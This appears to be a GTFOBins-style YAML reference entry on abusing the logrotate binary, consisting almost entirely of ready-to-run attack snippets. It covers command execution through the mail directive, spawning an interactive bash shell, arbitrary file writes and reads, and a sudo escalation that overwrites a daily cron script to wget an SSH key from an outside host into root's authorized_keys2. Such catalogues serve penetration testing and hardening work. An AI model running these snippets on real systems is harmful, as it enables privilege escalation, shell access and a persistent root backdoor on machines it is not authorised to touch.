---
functions:
  command:
    - description: Requires a logrotate policy which uses the `mail` directive. A hash should be used as the final character in the command, as it is run with a few arguments.
      code: |
        COMMAND='id &> /tmp/output #'
        TF=$(mktemp)
        echo "$COMMAND" > $TF
        chmod +x $TF
        logrotate -m "$TF" -v -f logrotate.policy
  shell:
    - description: Requires a logrotate policy which uses the `mail` directive.
      code: |
        COMMAND='/usr/bin/bash -i #'
        TF=$(mktemp)
        echo "$COMMAND" > $TF
        chmod +x $TF
        logrotate -m "$TF" -v -f logrotate.policy
  file-write:
    - description: Creates or overwrites the file with the exact text `logrotate state -- version 2`
      code: |
        LFILE=file_to_write
        logrotate -s "$LFILE" logrotate.policy
    - description: Creates or overwrites the file with junk data in combination with arbitrary data.
      code: |
        LFILE=file_to_write
        DATA=data_to_write
        logrotate -l "$LFILE" "$DATA"
  file-read:
    - description: Reads the first 'word'.
      code: |
        LFILE=file_to_read
        logrotate "$LFILE"
  sudo:
    - description: If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access. Note that this will overwrite `/etc/cron.daily/man-db` with a cronjob.
      code: sudo logrotate -l /etc/cron.daily/man-db '2>/dev/null;wget https://example.com/ssh.key -O /root/.ssh/authorized_keys2; exit 0;'
---
